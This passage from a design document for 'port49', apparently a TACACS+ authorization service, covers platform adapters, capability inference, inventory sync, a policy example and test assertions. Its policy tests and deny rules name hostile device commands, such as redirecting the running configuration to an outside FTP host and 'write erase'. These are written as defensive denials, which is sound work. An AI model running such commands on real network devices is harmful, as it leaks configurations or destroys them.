`ge-0/0/1` and `Ethernet1/1` denote the same kind of thing — a general cross-vendor
canonical naming scheme is a substantial project in its own right and is not required here.
Each platform states only which of *its* names belong to which class:

```yaml
  cisco_nxos:
    entity_classes:
      management: ['^mgmt[0-9]+$']
  juniper_junos:
    entity_classes:
      management: ['^(fxp0|em0)$']
```

One rule — `deny: interface @management` — then means the same thing everywhere, and a
platform that fails to define a referenced class produces a load error rather than a silent
non-match.

The same construct extends naturally to VRFs, VLAN ranges, and protocol instances. A more
capable variant sources classes from **inventory** rather than regex — `@core_uplinks`
defined by interface tags in the source of truth, so the class reflects the network rather
than a naming convention. That is deliberately deferred: interface-level inventory is a far
larger dataset (10,000 devices times tens of ports) than the device-level sync in §10.

### Projection for session-only platforms

Platforms that do not authorize per command receive port49's decision **projected** into
their native model. Junos is the motivating case: `allow-commands` and `deny-commands` are
returned as attributes at session authorization, generated from the role's rules rather than
looked up from a static table.

```yaml
  juniper_junos:
    supports: [session]
    command_projection: junos_regex
```

A trie of literal prefixes converts to an alternation mechanically —
`[start, **]` and `[file, **]` become `(start.*|file.*)` — and Junos uses extended regex, so
the absence of lookahead is no constraint that our grammar does not already accept.

**The risk is semantic, not syntactic.** Our precedence is most-specific-wins; the target
platform resolves its own allow/deny interaction by its own rules, which may differ and have
differed across releases. A policy correct in port49 can therefore be wrong on the device,
silently, because nothing errors. Two requirements follow:

- **Emit the resolved decision where possible.** Because evaluation is a total function, a
  result expressible as a pure allowlist is emitted as `allow-commands` alone, and the
  platform's own precedence never engages. Carve-outs force a `deny-commands` and reintroduce
  it, because an exception cannot be expressed in an allowlist without negation.
- **Differentially test the projection.** Generate the attributes, apply them in
  containerlab, and assert that the device's own view — `show cli authorization` on Junos —
  agrees with port49's decision across a corpus of probe commands. Where equivalence cannot
  be established for a rule shape, CI MUST refuse the policy rather than ship something
  unprovable.

**Anchoring is a per-platform property.** Our rules match the full vector. A device treating
`start.*` as unanchored would also match `request start …`, diverging from our semantics.
That belongs in the adapter and is asserted in the lab, never assumed.

**Importing existing configuration.** Simple alternations of prefix patterns convert to
token rules mechanically; arbitrary regex does not. A migration tool MUST convert what it can
and **flag the remainder for human review rather than approximating**, because a
mistranslated deny is precisely the failure a migration must not introduce.

### User-editable, day one

Operators MUST be able to define and override platforms without an upstream change. A fleet
containing Supermicro BMCs, Meinberg time servers, and HPE gear cannot wait on releases —
that is the ticket-queue bottleneck the design exists to remove.

Built-ins ship embedded in the binary; user files live in the policy repository and merge
over them, per top-level key:

```yaml
# platforms/arista_eos.yaml — adds one class, inherits everything else
platforms:
  arista_eos:
    entity_classes:
      uplink: ['^Ethernet(49|50|51|52)$']
```

`replace: true` on a platform block discards the built-in and starts clean. `based_on:`
declares a variant, using the same vocabulary as `parent:` on privilege levels:

```yaml
  whitebox_nos:
    based_on: arista_eos
    entity_classes:
      management: ['^ma1$']
```

User files receive identical structural validation to shipped ones: required fields,
attribute syntax, the 255-byte limit, and entity-class patterns must compile under RE2.

### Knowing what is shipped

Embedded definitions must not be opaque.

**They are files.** Sources live at `platforms/*.yaml` in the repository — browsable and
diffable across tags without running anything.

**They are introspectable**, and honest about verification:

```
$ port49 platform list
PLATFORM           SOURCE     VERIFIED       SUPPORTS
arista_eos         built-in   containerlab   session,commands,config_commands
cisco_nxos         built-in   containerlab   session,commands,config_commands
juniper_junos      built-in   containerlab   session
f5_bigip           built-in   community      session
meinberg_lantime   local      —              session
```

A community-contributed adapter nobody has run against a real image MUST say so rather than
appearing identical to one verified on every commit. `platform show <name>` prints a
definition, `--effective` the merged result after overrides, and `platform export --all`
writes them to disk.

**Published documentation is generated from the embedded files** at release time, so it
cannot drift from the binary.

**And the platform set is pinned.** If `arista_eos.privilege.admin` gains an attribute in a
release, upgrading the binary silently changes what every EOS admin session receives — a
**binary upgrade becomes an unreviewed policy change**. Policy therefore pins a version:

```yaml
platform_set: 1.4.0
```

Upgrading the binary changes nothing about rendering. `port49 platform upgrade` moves the pin
and reports exactly what changes:

```
platform_set 1.4.0 → 1.5.0

  arista_eos.privilege.admin
    + shell:roles*network-admin        (was absent)
    affects 4,412 devices, 6 subjects

  juniper_junos.supports
    + config_commands                  ⚠ 2 roles have config rules
                                         that were previously dead
```

CI SHOULD also report override drift — an override that now matches the built-in and can be
removed, or a built-in change an override shadows — so local platform files do not rot
silently as upstream improves.

**`port49 platform export <name>`** emits a file suitable for an upstream pull request:
written for one fleet on day one, contributed once proven.

### Unknown platforms

An unknown **device** — one not in inventory — fails closed. That is an admission decision.

An unknown **platform** is different: the device is legitimately admitted, we simply lack a
dialect file. It receives a generic adapter (`priv-lvl` only, `supports: [session]`) and
raises an alarm. Someone will always rack something unmodeled, and that must not take down
their login.

---

## 9. Capability inference

`supports` conflates nothing — it states what a platform is *capable* of. What a given
device is *configured* to do is a separate, per-device fact, and it is the one that is
silently wrong in real fleets.

An IOS or EOS switch is capable of config-command authorization. Whether it performs it
depends on `aaa authorization config-commands` having been typed on that box. A device with
it disabled looks completely healthy while every `interface` and `router bgp` line goes
unauthorized and unaccounted.

**port49 MUST infer observed capability from traffic it already handles**, and MUST NOT ask
an operator to assert it:

| Observation | Conclusion |
|---|---|
| Received `service=shell` with empty `cmd` | performs session authorization |
| Received `cmd=<word>` requests | performs command authorization |
| Permitted `configure terminal`, then saw no authorization requests before the session's next exec command or its end | config-command authorization is probably disabled |

The third is evidence, not proof — an operator can enter config mode and immediately leave —
so it MUST be evaluated statistically over a window rather than per session.

**Reconciling accounting against authorization** generalizes the technique. Where command
accounting is enabled, a command appearing in an accounting record with no corresponding
authorization request proves the device decided it locally:

```
⚠ UNAUTHORIZED TIER — leaf-04
    47 commands in accounting had no corresponding authorization request
    example: "show interfaces", "show version", "ping 10.0.0.1"
```

Every platform has a way to under-authorize silently, and each spells it differently — a
missing level on IOS (`aaa authorization commands 1`), a missing `config-commands` on NX-OS,
a level list instead of `all` on EOS. Reconciliation finds the gap without knowing which
spelling caused it, which is why it belongs here rather than in per-platform documentation.

This matters most in combination with privilege level. A session returned at `priv-lvl=2`
on a device configured only for `aaa authorization commands 15` submits **nothing** for
authorization — every command in that session is decided locally, and port49's rules, however
carefully written, are never consulted. The device looks entirely healthy throughout.

```
$ port49 devices capabilities
DEVICE      PLATFORM      SUPPORTS                          OBSERVED
leaf-01     arista_eos    session,commands,config_commands  session,commands,config_commands
leaf-04     arista_eos    session,commands,config_commands  session,commands   ⚠ config-commands off
pdu-dc1-a   generic       session                           session
ntp-01      meinberg      session                           —                  ⚠ never seen
```

Two checks fall out, and both are needed:

- **CI**: a granted role carries command rules that the platform's `supports` cannot
  enforce. Caught at review time.
- **Runtime**: the platform is capable but the device is not configured. Caught by drift
  detection.

> **Principle.** Never require an operator to assert something the system can observe.
> Anything declared by hand about device behavior will eventually be wrong, and it will be
> wrong silently.

---

## 10. Device inventory

TACACS+ carries no device identity — the daemon observes a source address and nothing more.
Every device attribute the engine depends on comes from an inventory, and so does the shared
secret each NAS uses.

### The inventory service

Source-of-truth interaction belongs in its own workload, `port49-inventory`. This is the
same rule the architecture applies one layer down: the daemon never talks to the directory,
and neither the broker nor the daemon talks to NetBox.

Three properties justify the separate component:

- **Connector faults cannot reach the authentication path.** Connectors are a contributable
  surface (below); running them out of process means a third-party connector that leaks
  memory or chokes on a large response takes down a syncer, not authentication.
- **Source-of-truth credentials live in exactly one workload.**
- **It is the component permitted to be a singleton.** One replica, no leader election, no
  high-availability story — because nothing depends on it being up. Placing the singleton
  where availability does not matter is a deliberate architectural choice.

```
GET  /v1/snapshot                    full snapshot; ETag for cheap no-op refresh
GET  /v1/snapshot/version            current version, for polling
GET  /v1/snapshot/diff?from=<ver>    for CI and `port49 inventory diff`
POST /v1/sync                        on-demand trigger
GET  /v1/healthz
GET  /v1/devices/{address}           diagnostic only — MUST NOT be used on the hot path
```

**Consumers pull and cache; they never query per request.** A daemon calling this API per
connection would make the syncer a hot-path dependency and rebuild the problem the component
exists to prevent.

**The service emits key *references*, never key material.** A snapshot carries
`key_ref: prod_key`, and the daemon resolves that from its own secret mount. A compromised
inventory service leaks the fleet list, not the ability to speak to it.

### Admission and keys

Admission splits along where the risk actually sits. The address list is not the security
boundary — **the shared key is.** A device connecting from an admitted range without the
right key sends unreadable data and gets nowhere. Admitting a broad range therefore costs
little, provided key *assignment* is controlled.

| Layer | Holds | Source |
|---|---|---|
| Inventory (synced) | device exists, its addresses, platform, attributes | NetBox / Nautobot |
| Policy repository | key groups — which CIDR or attribute pattern maps to which key reference; default deny | reviewed in a pull request |
| Secret manager | the key material | environment, Vault, or equivalent |

```yaml
# policy repository — intent
key_groups:
  - {match: {cidr: 10.0.0.0/8},       key_ref: prod_key}
  - {match: {attributes: {env: lab}}, key_ref: lab_key}
  # anything matching no group is refused
```

A device racked in a known site is admitted automatically with the correct key. One
appearing in an unexpected range matches no key group and is refused. The fleet list is
maintained once, in the source of truth, while the admission *decision* stays in review.

RFC 9887 replaces the shared key with mutual TLS, so a device record MUST be able to express
both.

### Device records

```yaml
  - name: leaf-01
    addresses: [10.0.1.5, 10.0.1.6, 2001:db8::5]
    platform: arista_eos
    attributes: {site: dc1, role: leaf, os_version: "4.31.2F"}
```

**Every address a device may source from must be listed.** TACACS is commonly sourced from a
loopback or dedicated management interface that is not the device's primary address. A
device sourcing from an unlisted interface fails device binding, and the failure will not
obviously trace back to inventory. `ip tacacs source-interface` — or the platform equivalent
— MUST be pinned in the reference AAA configuration.

### Connectors and sync cadence

**NetBox and Nautobot** are the verified pair. Infrahub, Ansible inventory, and a plain file
follow the same snapshot contract. A file connector is required regardless, as the inventory
equivalent of the in-memory store — containerlab runs, CI policy tests, and `port49 explain`
against a hypothetical device all need an inventory that is not a live source of truth.

Four triggers, not one:

- **Scheduled full sync every 10 minutes.** That is the window a newly-racked device sits
  un-admittable if a webhook is missed, which is about the tolerance before it becomes a
  ticket.
- **Webhook-driven refresh.** Both products emit outbound webhooks on device create and
  update, giving seconds for the common case without polling harder.
- **`port49 inventory sync`** on demand.
- **Full sync at startup**, refusing to serve with no snapshot at all.

Four requirements:

**Version detection.** NetBox 4.x renamed `device_role` to `role`; Nautobot 2.0 did the same
and dropped `slug` from most models. The connector selects a mapping profile from the API
root version, with an explicit override available.

**GraphQL first.** At 10,000 devices, REST pagination is hundreds of round trips per sync.
Both products expose GraphQL; one query returns devices, addresses, platform, site, role,
and tags. REST remains a fallback for older installations.

**Bounded change per sync.** A sync that would remove more than `max_removed_percent` of the
fleet MUST refuse, retain the last good snapshot, and alarm. A partially-available source of
truth or a mistyped filter would otherwise silently deauthorize the fleet.

**Platform slug translation.** Real installations say `eos`, `arista-eos`, `arista_eos`, or
`veos`. Ship an alias table, allow overrides, and warn on unrecognized slugs rather than
falling back to generic in silence.

```yaml
inventory:
  sync:
    - name: netbox_prod
      type: netbox
      url: https://netbox.example.com
      token: ${NETBOX_TOKEN}
      interval: 10m
      filter: {status: active, has_primary_ip: true}
      map:
        site:       site.slug
        role:       device_role.slug
        platform:   platform.slug
        os_version: custom_fields.os_version
      safety:
        max_removed_percent: 10
```

### How a daemon refreshes its snapshot

```
every 30s:
  GET /v1/snapshot/version
  if version == held.version:  done          ← the common case
  GET /v1/snapshot  (If-None-Match: <etag>)
  parse → build index → validate → atomic pointer swap
```

**Build fully, then swap.** The snapshot is parsed and indexed into a prefix trie
(`address or CIDR → device, key_ref`) before anything is exchanged, then swapped by a single
atomic pointer store. Readers take no lock, and in-flight connections complete against the
snapshot they began with. Never mutate in place.

**Validate locally before swapping.** The service already applies bounded-change safety, but
the daemon MUST NOT trust the payload: reject a snapshot that fails to parse, that is empty,
or that drops more than the configured share; retain the previous one and alarm.

**The snapshot never expires.** Staleness is a metric and an alarm —
`inventory_snapshot_age_seconds` — never a fail-closed. An admission table with a TTL means a
prolonged syncer outage eventually halts all authentication fleet-wide, which is the
readiness-probe mistake of §12 of the design document in a different form. A stale device
list is a far smaller problem than no device list; revoking a specific device is a key
rotation, not a sync.

**Cold start is the one case where readiness gating is correct.** A daemon with no snapshot
genuinely cannot serve, so it remains unready and retries. This is safe precisely because,
unlike store health, only *new* pods lack a snapshot — existing replicas continue serving and
all endpoints are never lost at once. The last good snapshot SHOULD be persisted to local
disk so a restart does not require the service at all.

**Key resolution stays local.** An unresolvable `key_ref` fails that device closed — not the
daemon — and alarms, because that is a misconfiguration worth hearing about on the first
device rather than the ten-thousandth.

**Every swap logs a summary** — `snapshot v1841 → v1842: +3 devices, -1, 2 changed` — so an
unexpected fleet change is visible in the daemon's own logs, not only in the service's.

### Source-of-truth write access is privilege-granting

If scopes match on synced attributes (§5.5), whoever can change a device's `role` or
`os_version` can move it into or out of a scope — with no policy change, no pull request, and
no diff. The policy file looks untouched.

Mitigations, designed in rather than documented afterward:

- Scope-membership changes MUST appear in the sync diff and be reviewable.
- A scope MUST be able to pin a device set explicitly instead of by attribute.
- Scopes carrying denies SHOULD set `security_log: true`, so membership changes are logged
  and alerted as security events rather than routine inventory churn.
- Attributes used for security scoping SHOULD come from an attested path rather than a
  hand-editable field.

> **Principle.** The source of truth supplies facts about devices; the policy repository
> supplies intent. The moment a source-of-truth tag can grant a permission, authorization has
> left code review — which is the outcome the design document's §9 exists to prevent.

---

## 11. Complete policy example

```yaml
platform_set: 1.4.0

privilege_levels:
  - {name: readonly}
  - {name: read_only_limited, parent: readonly}
  - {name: operator}
  - {name: admin}

key_groups:
  - {match: {cidr: 10.0.0.0/8},       key_ref: prod_key}
  - {match: {attributes: {env: lab}}, key_ref: lab_key}

scopes:
  - {name: all_devices, match: {}}
  - {name: dc_fabric,   match: {site: [dc1, dc2], role: [leaf, spine]}}
  - name: srx_unpatched
    match: {platform: juniper_junos, os_version: {lt: "21.4R3-S5"}}
    on_missing: include
    security_log: true

roles:
  - name: read_only
    privilege: readonly
    permit:
      - show **
      - terminal length *

  - name: read_only_limited
    privilege: read_only_limited
    permit:
      - show version
      - show interfaces **
      - show ip route **

  - name: network_admin
    privilege: admin
    permit: ["**"]
    pipe:
      permit: ["**"]

  - name: bgp_operator
    privilege: operator
    permit:
      - show bgp **
      - clear bgp /^[0-9]+$/ **
      - clear bgp neighbor **
    deny:
      - clear bgp all

  - name: interface_tech
    privilege: operator
    permit:
      - configure **
      - interface @physical
      - shutdown
      - no shutdown
      - description **
      - end
    deny:
      - interface @management

  - name: elevated_session
    privilege: admin
    reason: "device exposes show running-config only at level 15"

  - name: no_disruptive
    deny:
      - reload **
      - write erase **

  - name: cve_2026_xxxx
    reason: "CVE-2026-XXXX — SRX cluster subsystem"
    deny:
      - show chassis cluster **

  - name: cve_2026_xxxx_assess
    reason: "CVE-2026-XXXX — IR needs cluster state to assess exposure"
    permit:
      - show chassis cluster status

subjects:
  - {name: netops_admins, group: "CN=netops-admins,OU=Groups,DC=example,DC=com",
     enable: token, token_ttl: 60s}
  - {name: noc_tier1,     group: "CN=noc-tier1,OU=Groups,DC=example,DC=com",
     enable: none,  token_ttl: 60s}
  - {name: security_ir,   group: "CN=security-ir,OU=Groups,DC=example,DC=com",
     enable: token, token_ttl: 60s}
  - {name: svc_oxidized,  identity: "system:serviceaccount:netops:oxidized",
     enable: token, token_ttl: 900s}

grants:
  - {subject: netops_admins, scope: all_devices,   roles: [network_admin], max_privilege: admin}
  - {subject: noc_tier1,     scope: all_devices,   roles: [read_only, no_disruptive]}
  - {subject: noc_tier1,     scope: dc_fabric,     roles: [interface_tech], expires: 2026-12-01}
  - {subject: svc_oxidized,  scope: all_devices,   roles: [read_only, elevated_session]}
  - {subject: security_ir,   scope: srx_unpatched, roles: [cve_2026_xxxx_assess]}
  - {subject: everyone,      scope: srx_unpatched, roles: [cve_2026_xxxx]}

tests:
  - {subject: noc_tier1,    device: leaf-01, command: "show version",   expect: permit}
  - {subject: noc_tier1,    device: leaf-01, command: "reload",         expect: deny}
  - {subject: noc_tier1,    device: leaf-01, command: "show run | redirect ftp://x",
     expect: deny}
  - {subject: svc_oxidized, device: leaf-01, command: "show running-config",
     expect: permit}
  - {subject: svc_oxidized, device: srx-fw-04, command: "show chassis hardware",
     expect: permit}      # more specific permit beats the CVE deny
  - {subject: noc_tier1,    device: srx-fw-04, command: "show chassis cluster status",
     expect: deny}
  - {subject: security_ir,  device: srx-fw-04, command: "show chassis cluster status",
     expect: permit}
```

Three things this example is chosen to show.

**No vendor attribute string appears anywhere.** `interface @management` and
`privilege: readonly` carry all the platform-specific knowledge, resolved by the adapter.

**`svc_oxidized` composes two roles rather than overriding a level.** `read_only` supplies
the command rules, `elevated_session` supplies the privilege, and the reason the elevation
exists is recorded on the role that carries it.

**The CVE mitigation is three lines and self-limiting.** It applies to every principal on
every unpatched SRX including devices not yet racked, lapses per device as inventory reflects
the upgrade, and admits a deliberate, narrow exemption for incident response through the same
mechanism as everything else.

---

## 12. Tooling

Policy is reviewable only if reviewers see effect, not text.

**`port49 explain`** resolves a hypothetical decision and names exactly one reason,
including which role would grant a denied command. On a platform where the relevant control
cannot be enforced — `pipe_authorized: false`, or `supports` lacking `config_commands` — it
MUST say so rather than reporting a decision the device will not honor.

**Effective-permission diff in CI.** Because evaluation is order-free set algebra over token
trees, `permits ∖ denies` is a computable object and old-versus-new is an exact difference.
Leaf regex is the one construct that degrades this: a regex position is not enumerable, so
the diff reports *"argument 3 is regex-constrained and the constraint changed"* rather than
listing commands. This is contained, and is a reason to prefer literals and `*`.

**Policy tests** run in CI against a file-backed inventory, as in §11.

**Intersection checks.** Because the effective permission set is the intersection of what
the device offers and what port49 permits (§6), CI MUST report where the two disagree. Neither of these is visible in any existing TACACS+
system, and both are ordinary review questions once surfaced:

```
⚠ DEAD RULES — interface_tech permits commands its privilege cannot reach
    privilege: readonly  →  arista_eos priv-lvl=1
    unreachable: configure **, interface /^(ethernet|port-channel)/, shutdown
    the device will never submit these for authorization

⚠ FALLBACK EXPOSURE — svc_oxidized
    port49 rules confine it to:  show **
    device role on failure:      network-admin  (full administrative access)
    if port49 is unreachable, this subject has more access than policy grants
```

**Attribute shadowing.** Where a role or grant attribute overrides a platform attribute of
the same name (§6), CI MUST name both so the override is deliberate.

**`port49 devices capabilities`** reports the `supports`-versus-`observed` matrix from §9.

**Shadowed-deny report.** Because a more specific permit can override a deny (§5.4), CI MUST
name every shadowed deny, the subject it fails to bind, and the permit that beats it. This is
what replaces the guarantee deny-overrides would have provided.

**Privilege-expansion gate.** The check that matters under most-specific semantics is not
"did the permit set grow" but **"does this change make command C permitted where it was
denied"** — computable exactly from the trie.

**`port49 platform upgrade`** reports what a platform-set bump changes, so a binary upgrade
is never an unreviewed policy change (§8).

**Access review** is a rendering of the flat grant table, not an investigation.

---

## 13. Decisions

Six questions were left open in the first draft of this document and have since been
resolved. Recorded here because the reasoning matters more than the outcome.

**1. Precedence — most-specific-wins, ties to deny.** Deny-overrides is simpler to state but
cannot express an exception without negation, and RE2 has no lookahead. The motivating case
was real: a broad `show chassis *` deny added for a CVE broke a backup account's
`show chassis hardware`. Most-specific supplies exceptions in the existing grammar while
keeping order-independence and an exact diff. There is exactly **one** deny mechanism; a
shadowed deny is surfaced by CI rather than prevented by a second construct. (§5.4)

**2. Grant shape — flat.** One row per subject × scope × roles. Greppable, renders directly
as the access-review report, and makes a fleet-wide emergency grant a single appended line
rather than a structural edit made under pressure. The cost is offboarding across scattered
rows, addressed by tooling. (§11)

**3. Privilege on the role, never overridden on a grant.** An override has nowhere to record
why it exists, and because the level also selects the device-local role that applies when
port49 is unreachable, an inline override silently changes degraded-mode behavior. Role
explosion is avoided by composition — a privilege-only role such as `elevated_session` —
rather than by variants. (§6)

**4. Privilege levels — shipped defaults plus user extension.** `readonly`, `operator`, and
`admin` are reserved and always present so shipped platform files always resolve; operators
declare their own ordering and add levels, with `parent:` supplying a rendering fallback so a
new level does not require a mapping for every vendor. (§6)

**5. Device admission — inventory for existence, policy repository for key assignment.** The
address list is not the security boundary; the key is. Splitting there means the fleet is
maintained once in the source of truth while the admission decision stays in review. (§10)

**7. Version comparison — one generic comparator, no per-vendor setting.** Tokenize into
digit and letter runs; digits compare numerically, letters by equality only. An incomparable
version folds into `on_missing` and is assumed unpatched, and the devices affected are always
reported rather than silently swept in. Fleets cluster at a few versions through natural
upgrade cycles, so the ambiguous case is rare — and when it fires, over-mitigating is the
right failure. (§5.5)

**6. Entity naming — classes, not canonicalization.** Adapters classify their own names into
`@management`, `@physical`, and similar rather than mapping every vendor into a common
scheme. A rule referencing an undefined class is a load error, which eliminates the silent
non-match. (§4, §8)

### Deferred, with reasons

Neither of these is an open question about the design. Both are closed for v1 on the
reasoning below.

**Inventory-sourced entity classes.** Defining `@core_uplinks` from interface tags in the
source of truth is better in principle than a regex, because *which* ports are uplinks is a
fact about the network rather than a naming convention. It is deferred because regex classes
cover what command rules actually reference — `@management`, `@loopback`, `@physical`, and
site-specific port ranges — while interface-level sync is a far larger dataset than the
device-level sync in §10: tens of ports per device against 10,000 devices, rather than 10,000
records. Revisit only when a rule proves inexpressible with regex classes, which is a concrete
trigger rather than a guess.

**Projection equivalence.** Which rule shapes render faithfully into a session-only platform's
native model — Junos `allow-commands` and `deny-commands` — cannot be settled on paper. It
requires a device image, a generated attribute pair, and a probe corpus compared against the
device's own view (`show cli authorization`). It is therefore a work item in sequencing step 4,
not a decision: the requirement is already specified in §8, and the outcome is a per-platform
list of shapes CI refuses. Recorded here only so it is not mistaken for an unresolved design
question.

---

## 14. Required test assertions

Beyond those already listed in the design document's §14:

**Matching and precedence**

- **Full-vector matching**: `show bgp summary` does not match `show bgp summary detail`.
- **Case-insensitive literals**: `SHOW RUN` is treated as `show run`.
- **Most-specific resolution**: a permit of `show chassis hardware` beats a deny of
  `show chassis **`, while `show chassis hardware detail` remains denied.
- **Ties go to deny** for rules of equal specificity.
- **Order independence**: a policy file with roles, grants, and rules shuffled produces
  byte-identical decisions across the full test corpus.
- **Entity classes**: one rule using `@management` denies `Management1` on EOS, `mgmt0` on
  NX-OS, and `fxp0` on Junos; a rule referencing a class a platform does not define fails at
  load.
- **Pipeline enforcement**: `show run | redirect …` denied under a role permitting `show **`;
  chained stages each evaluated.
- **Abbreviation handling**: on a platform with `expands_abbreviations: false`, an
  abbreviated command either expands correctly or is denied — never silently unmatched.

**Attributes and privilege**

- **Session authorization returns correct attributes per platform**, with mandatory versus
  optional honored. A mandatory attribute a platform cannot parse causes the device to reject
  the session, so it must be caught in the lab.
- **Attribute layering**: platform → role → grant, most specific winning, shadowing reported.
- **255-byte argument limit** enforced at policy load, including generated projection
  attributes.
- **Unknown attributes default to optional.**
- **Privilege composition**: `max` across granted roles over the declared ordering;
  `parent:` resolves transitively; an unresolvable level fails at load.
- **Enable**: all three mechanisms, including the `$enab15$` username path resolving through
  login context keyed on `(nas, port)`.
- **Receipt binds the credential**: a retry presenting a different credential from the same
  device, line, and username is rejected, while a byte-identical retransmission replays.
- **CHAP verification**: a candidate set of several unspent tokens resolves to the one that
  produces the matching digest; the atomic removal, not the verification, decides single use,
  and two replicas racing the same token yield exactly one success.
- **CHAP re-prompt**: a fresh challenge does not match the receipt and correctly fails rather
  than replaying.
- **Encryption at rest**: a store dump contains no recoverable token; redemption succeeds
  across a key rotation window in which both keys are accepted.
- **`enable: auto` is refused at policy load** on a platform whose `enable_username` is not
  `principal`.
- **Context teardown**: a redemption overwrites; an authentication START with a different
  username invalidates even when rejected; an ASCII login invalidates once the username
  arrives in a CONTINUE; an exec accounting START for the port invalidates.
- **Context is never created without redemption** — a locally-authenticated session has none
  and is denied.
- **Username binding on the command path**: a request whose username differs from the stored
  one is denied and the context invalidated.
- **`rem_addr` binding on enable**: a mismatch is refused and alerted.
- **Recycled line**: a context outliving its session is not inheritable by the next occupant
  of that line under any of the teardown triggers.
- **Idle session survives**: a login quiet for longer than the former five-minute TTL still
  authorizes its next command.

**Platform and projection**

- **Projection equivalence**: generated `allow-commands`/`deny-commands` produce the same
  decisions on a real device — asserted via `show cli authorization` on Junos — across a
  probe corpus; CI refuses rule shapes that cannot be proven equivalent.
- **Platform layering**: user files merge per top-level key; `replace: true` discards the
  built-in; `based_on:` inherits.
- **`platform_set` pinning**: changing the binary without moving the pin produces
  byte-identical rendered attributes.

**Inventory and capability**

- **Snapshot refresh**: atomic swap; in-flight connections complete against the prior
  snapshot; a malformed, empty, or over-shrinking snapshot is rejected and the previous one
  retained.
- **Snapshot never expires**: a daemon with a stale snapshot and an unreachable inventory
  service continues authenticating, alarming on age.
- **Cold start**: a daemon with no snapshot stays unready while existing replicas keep
  serving.
- **Unresolvable `key_ref`** fails that device closed, not the daemon.
- **Inventory sync safety**: a sync removing more than the configured share is refused and
  the previous snapshot retained.
- **Config-mode inference**: a device with config-command authorization disabled is detected
  and reported.
- **Accounting reconciliation**: commands present in accounting with no authorization request
  are reported as an unauthorized tier.
- **Unknown platform** falls back to generic and alarms; **unknown device** is refused.

**Scoping**

- **State-scoped mitigation**: a device leaving `srx_unpatched` on the next sync regains the
  denied command with no policy change.
- **`on_missing`**: a device lacking the scoped attribute is included for a deny-bearing
  scope and excluded for a permit-bearing one.
